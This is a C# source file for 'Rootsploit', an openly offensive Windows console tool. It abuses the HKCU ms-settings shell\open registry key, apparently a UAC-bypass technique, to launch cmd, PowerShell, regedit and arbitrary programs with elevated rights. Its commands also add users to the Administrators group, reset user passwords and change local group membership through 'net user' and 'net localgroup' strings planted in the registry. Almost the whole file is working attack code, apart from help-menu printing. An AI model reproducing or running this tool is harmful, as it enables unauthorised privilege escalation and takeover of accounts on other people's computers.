using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Rootsploit
{
    internal class Program
    {
        static string GetRandomString(int lenOfTheNewStr)
        {
            string rndstring = string.Empty;
            while (true)
            {
                rndstring = rndstring + Path.GetRandomFileName().Replace(".", string.Empty);
                if (rndstring.Length > lenOfTheNewStr)
                {
                    rndstring = rndstring.Substring(0, lenOfTheNewStr);
                    break;
                }
            }
            return rndstring;
        }

        static void Main(string[] args)
        {
            Console.Clear();
            string art = @"    ___  ____  ____  ______         __     _ __ 
   / _ \/ __ \/ __ \/_  __/__ ___  / /__  (_) /_
  / , _/ /_/ / /_/ / / / (_-</ _ \/ / _ \/ / __/
 /_/|_|\____/\____/ /_/ /___/ .__/_/\___/_/\__/ 
                           /_/ ";
            string rootPath = Path.GetPathRoot(Environment.CurrentDirectory);

            #region CheckProgramWasStartedAsRootOrUser
            string rndstring = GetRandomString(20);
            try
            {
                string dirpath = rootPath + @"Windows\" + rndstring;
                Directory.CreateDirectory(dirpath);
                Directory.Delete(dirpath);
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(art);
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.Write("App runned as: ");
                Console.ForegroundColor= ConsoleColor.DarkRed;
                Console.Write("ROOT");
                Console.WriteLine("");
                Console.WriteLine("");

            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine(art);
                Console.Write("App runned as: ");
                Console.ForegroundColor= ConsoleColor.White;
                Console.Write("USER");
                Console.WriteLine("");
                Console.WriteLine("");
                string CurrentDirForRegistry = Environment.CurrentDirectory;
                Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\currentdir").SetValue("currentdir", CurrentDirForRegistry, RegistryValueKind.String);

            }
            #endregion

            RegistryKey currentUserKey = Registry.CurrentUser;
            RegistryKey key = currentUserKey.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\currentdir");

            string CurrentDir = key.GetValue("currentdir").ToString();

            void Command()
            {
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write("COMMAND");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.Write("]");
            }

            Console.ForegroundColor = ConsoleColor.White;

            Console.WriteLine("Print ? to display commands");
            Console.WriteLine("");

            try
            {
                BeepBoopUAC.BeepBoop(args[0]);
                Environment.Exit(0);
            }
            catch
            {

            }

            while (true)
            {
                Command();
                Console.Write(">");
                Console.ForegroundColor = ConsoleColor.White;
                //string arg = Console.ReadLine();
                string line = Console.ReadLine();
                string[] cmd = line.Split(' ');

                if (cmd[0] == "exec")
                {
                    if (cmd[1] == "cmd")
                    {
                        BeepBoopUAC.BeepBoop(rootPath + @"Windows\System32\cmd.exe");
                    }
                    else if (cmd[1] == "reg")
                    {
                        BeepBoopUAC.BeepBoop(rootPath + @"Windows\regedit.exe");
                    }
                    else if (cmd[1] == "powershell")
                    {
                        BeepBoopUAC.BeepBoop(rootPath + @"Windows\System32\WindowsPowerShell\v1.0\powershell.exe");
                    }
                    else if (cmd[1] == "control")
                    {
                        BeepBoopUAC.BeepBoop(rootPath + @"Windows\System32\control.exe");
                    }

                    else
                    {
                        try
                        {
                            BeepBoopUAC.BeepBoop(cmd[1]);
                        }
                        catch
                        {
                            Console.WriteLine("!В ходе выполнения произошла ошибка!");
                            Console.WriteLine("");
                        }
                    }
                }
                else if (cmd[0] == "elevate")
                {
                    if (cmd[1] == "me")
                    {
                        string user = Environment.UserName;
                        Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\usertoelevate").SetValue("usertoelevate", user, RegistryValueKind.String);
                        BeepBoopUAC.BeepBoop(CurrentDir + @"\CMDelevater.exe");
                    }
                    else if (cmd[1] == "prog")
                    {
                        string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                        BeepBoopUAC.BeepBoop(path);
                        Environment.Exit(0);
                    }
                    else if (cmd[1] == "user")
                    {
                        string username = cmd[2];
                        Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\cmdparam").SetValue("cmdparam", "/k net localgroup Администраторы " + username + " /add", RegistryValueKind.String);
                        BeepBoopUAC.BeepBoop(CurrentDir + @"\CmdParamCall.exe");
                    }
                }
                else if (cmd[0] == "?")
                {
                    Console.WriteLine("");
                    Console.WriteLine("exec");
                    Console.WriteLine("{======================================================================================}");
                    
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("                                                                                       ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write(@"exec [fullpath to file] - exec C:\Windows\regedit.exe : runs app as root               ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("exec cmd : runs cmd as root                                                            ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("exec reg : runs regedit as root                                                        ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("exec powershell : runs powershell as root                                              ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("exec control : runs controlpanel as root                                               ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("                                                                                       ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    //Console.BackgroundColor = ConsoleColor.White;
                    //Console.ForegroundColor = ConsoleColor.Black;
                    //Console.Write("babababababab");
                    //Console.ForegroundColor = ConsoleColor.White;
                    //Console.BackgroundColor = ConsoleColor.Black;
                    //Console.Write("|");
                    Console.WriteLine("{======================================================================================}");
                    Console.WriteLine("");
                    Console.WriteLine("");
                    Console.WriteLine("elevate");
                    Console.WriteLine("{======================================================================================}");
                    
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("                                                                                       ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write(@"elevate me - elevate me : promote current user to administrator                        ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write(@"elevate user - elevate user [username] : promote user to administrator                 ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write(@"elevate prog - elevate prog : run rootsploit as root by exploit                        ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("                                                                                       ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.WriteLine("{======================================================================================}");
                    Console.WriteLine("");

                    Console.WriteLine("user");
                    Console.WriteLine("{======================================================================================}");

                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("                                                                                       ");//126 symbols
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write(@"user changepass - user changepass [username] [newpass] : change user pass              ");//127 symbols
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write(@"user addgroup - user addgroup [username] [group name] : add user to local group        ");//127 symbols
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write(@"user delgroup - user delgroup [username] [group name] : delete user from group         ");//127 symbols
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.BackgroundColor = ConsoleColor.White;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.Write("                                                                                       ");//126 symbols
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.BackgroundColor = ConsoleColor.Black;
                    Console.Write("|");
                    Console.WriteLine("");

                    Console.WriteLine("{======================================================================================}");
                    Console.WriteLine("");
                }

                else if (cmd[0] == "user")
                {
                    if (cmd[1] == "changepass")
                    {
                        string name = cmd[2];
                        string newpass = cmd[3];
                        Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\cmdparam").SetValue("cmdparam", "/k net user " + name + " " + newpass, RegistryValueKind.String);
                        BeepBoopUAC.BeepBoop(CurrentDir + @"\CmdParamCall.exe");
                    }
                    else if (cmd[1] == "addgroup")
                    {
                        string username = cmd[2];
                        string group = cmd[3];
                        Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\cmdparam").SetValue("cmdparam", "/k net localgroup " + group + " " + username + " /add", RegistryValueKind.String);
                        BeepBoopUAC.BeepBoop(CurrentDir + @"\CmdParamCall.exe");
                    }
                    else if (cmd[1] == "delgroup")
                    {
                        string username = cmd[2];
                        string group = cmd[3];
                        Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\cmdparam").SetValue("cmdparam", "/k net localgroup " + group + " " + username + " /delete", RegistryValueKind.String);
                        BeepBoopUAC.BeepBoop(CurrentDir + @"\CmdParamCall.exe");
                    }
                }
                else if (cmd[0] == "exit")
                {
                    Environment.Exit(0);
                }
            }
        }

    }
}

